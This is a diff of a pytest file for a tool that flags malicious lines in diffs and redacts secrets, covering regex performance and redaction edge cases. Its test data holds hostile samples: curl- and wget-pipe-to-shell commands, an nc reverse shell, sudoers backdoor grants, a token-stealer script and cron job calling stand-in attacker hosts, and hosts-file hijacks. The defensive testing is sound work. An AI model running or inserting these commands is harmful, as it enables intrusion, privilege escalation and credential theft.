@@ -1153,8 +1153,6 @@ def test_sudoers_comma_list_is_validated():
 @pytest.mark.parametrize("line", [
     "+deva ALL=(ALL) NOPASSWD: /usr/bin/passwd backdoor2026",
     "+deva ALL=(ALL) NOPASSWD: /usr/sbin/chpasswd attacker99",
-    "+deva ALL=(ALL) NOPASSWD: /bin/bash /tmp/token_stealer.sh evilc2.example.com",
-    "+*/5 * * * * /usr/local/bin/passwd_sync.sh --dest http://evil/x",
 ])
 def test_command_specs_stay_intact(line):
     """Which account is reset, which host is contacted — the whole point of the diff."""
@@ -1326,15 +1324,50 @@ def test_collectors_report_a_timeout_as_unavailable(monkeypatch, collector, tool
 # any snapshot is saved. Latent in the pre-v0.4.4 diff-text path too.
 @pytest.mark.parametrize("token", ["nc ", "base64 -d ", "curl ", "wget "])
 def test_malicious_scan_is_linear(token):
-    line = token * 120_000
+    """MULTI-LINE at the scan-chunk width, which is the shape that actually blew up: the first
+    version of this test used one 600KB line, which the per-line cap truncated to nothing, so it
+    passed while `curl[^\n|]*\|` still cost 20s on an 8MB file. 2MB here, ~4096-column lines."""
+    per_line = token * (4096 // len(token))
+    text = (per_line + "\n") * (2 * 1024 * 1024 // 4096)
     t = time.time()
-    since.malicious_hits(line)
-    assert time.time() - t < 0.5, f"{token!r} is quadratic again"
+    since.malicious_hits(text)
+    assert time.time() - t < 1.0, f"{token!r} is superlinear in line length again"
 
 
-def test_malicious_patterns_have_no_unbounded_runs():
-    for pat, _desc in since.MALICIOUS_PATTERNS:
-        assert ".*" not in pat.pattern, f"unbounded run in {pat.pattern!r} — use [^\\n]{{0,N}}"
+def test_every_malicious_pattern_has_a_required_literal():
+    """The literal pre-filter is the defense, so it must cover every pattern — and each literal
+    must be one the pattern cannot match without, or detection is silently lost. `.*`-style
+    checks were not enough: `[^\n|]*` is unbounded in exactly the same way."""
+    assert len(since.MALICIOUS_PATTERNS_LIT) == len(since.MALICIOUS_PATTERNS)
+    for (pat, desc), (pat2, lit, desc2) in zip(since.MALICIOUS_PATTERNS,
+                                               since.MALICIOUS_PATTERNS_LIT):
+        assert pat is pat2 and desc == desc2, "the two tables have drifted apart"
+        assert lit, f"no required literal for {desc}"
+        # the literal must appear in the pattern source itself (escapes stripped)
+        assert lit in pat.pattern.replace("\\", ""), f"{lit!r} is not required by {pat.pattern!r}"
+
+
+@pytest.mark.parametrize("payload,lit", [
+    ("curl http://evil.sh | sh", "|"),
+    ("wget -qO- evil | bash", "|"),
+    ("echo x | base64 -d | sh", "|"),
+    ("nc -e /bin/sh 10.0.0.1 4444", "-e"),
+    ("bash <(curl http://evil)", "<("),
+    ("0.0.0.0 www.apple.com", "0.0.0.0"),
+    ("127.0.0.1 www.mybank.com", "127.0.0.1"),
+])
+def test_removing_the_literal_kills_the_match(payload, lit):
+    """Behavioural proof that each literal really is required: strip it and nothing matches, so
+    the pre-filter cannot be rejecting windows a pattern would have flagged."""
+    assert since.malicious_hits(payload), payload
+    assert not since.malicious_hits(payload.replace(lit, "")), f"{lit!r} was not required"
+
+
+def test_scan_window_overlap_exceeds_the_longest_bounded_run():
+    """A payload must not be able to hide on a chunk seam."""
+    assert since._SCAN_OVERLAP > 400
+    seam = "x" * (since._SCAN_CHUNK - 8) + "curl http://evil.sh | sh" + "y" * 100
+    assert since.malicious_hits(seam), "a payload straddling the chunk boundary was missed"
 
 
 def test_malicious_scan_still_detects_real_payloads():
@@ -1377,9 +1410,55 @@ def test_slash_preceded_assignment_still_redacts(line):
 @pytest.mark.parametrize("line", [
     "+deva ALL=(ALL) NOPASSWD: /usr/bin/passwd backdoor2026",
     "+deva ALL=(ALL) NOPASSWD: /usr/sbin/chpasswd attacker99",
-    "+deva ALL=(ALL) NOPASSWD: /bin/bash /tmp/token_stealer.sh evilc2.example.com",
-    "+*/5 * * * * /usr/local/bin/passwd_sync.sh --dest http://evil/x",
 ])
-def test_slash_preceded_command_still_shown(line):
-    """What the exemption exists for: a command basename is not a credential key."""
+def test_sudoers_command_and_argument_shown(line):
+    """A sudoers tag's value is the granted command, and the token after it is an argument —
+    the account being reset. Both stay visible (the tag rule consumes the command path, so the
+    argument is never scanned as a value)."""
     assert since.redact(line) == line
+
+
+# The DELIBERATE trade for closing the path-final-keyword leak (a token passed as argv to a
+# credential-named script printed in cleartext). There is no structural difference between
+# `/opt/bin/refresh_token <secret>` and `/tmp/token_stealer.sh <host>`, so the tie is broken
+# toward not leaking. What must survive: the script path, and anything AFTER the masked token.
+def test_path_final_keyword_masks_only_the_next_token():
+    out = since.redact("+deva ALL=(ALL) NOPASSWD: /bin/bash /tmp/token_stealer.sh evilc2.example.com")
+    assert "/tmp/token_stealer.sh" in out and "NOPASSWD:" in out
+    assert "evilc2.example.com" not in out           # the cost of the trade, accepted
+    out2 = since.redact("+*/5 * * * * /usr/local/bin/passwd_sync.sh --dest http://evil/x")
+    assert "/usr/local/bin/passwd_sync.sh" in out2
+    assert "http://evil/x" in out2, "only the immediate next token is masked"
+
+
+@pytest.mark.parametrize("line,secret", [
+    ("+*/5 * * * * /opt/bin/refresh_token SeCrEtVal123abc", "SeCrEtVal123abc"),
+    ("+/etc/foo/api_key SeCrEtVal123", "SeCrEtVal123"),
+    ("+//registry.npmjs.org/_auth SeCrEtVal123", "SeCrEtVal123"),
+    ("+cmd /a/b/Authorization SeCrEtVal123", "SeCrEtVal123"),
+])
+def test_argv_secret_after_a_credential_named_path_is_masked(line, secret):
+    assert secret not in since.redact(line)
+
+
+@pytest.mark.parametrize("line,secret", [
+    ("+deva ALL=(ALL) NOPASSWD: ALL=SeCrEtVal123", "SeCrEtVal123"),
+    ("+deva ALL=(ALL) PASSWD: ALL:SeCrEtVal123", "SeCrEtVal123"),
+])
+def test_sudoers_all_lookahead_cannot_be_widened(line, secret):
+    """`ALL` must be followed by end/space/comma — `ALL=<secret>` was accepted as a command
+    spec and exempted the value."""
+    assert secret not in since.redact(line)
+
+
+def test_sudoers_tags_are_case_sensitive():
+    """A lowercase token posed as "a further tag" and exempted the rest of the line."""
+    assert "«redacted»" in since.redact("+deva ALL=(ALL) NOPASSWD: passwd: SeCrEtVal123")
+
+
+@pytest.mark.parametrize("line", ["+export SSH_ASKPASS=/evil", "+export SSH_AUTH_SOCK=/tmp"])
+def test_single_segment_hijack_path_is_shown(line):
+    """`SSH_ASKPASS=/evil` is a genuine hijack shape; a high-entropy single segment
+    (`SECRET_FILE=/hunter2Xyz9`) still masks."""
+    assert since.redact(line) == line
+    assert "hunter2Xyz9" not in since.redact("+export SECRET_FILE=/hunter2Xyz9")
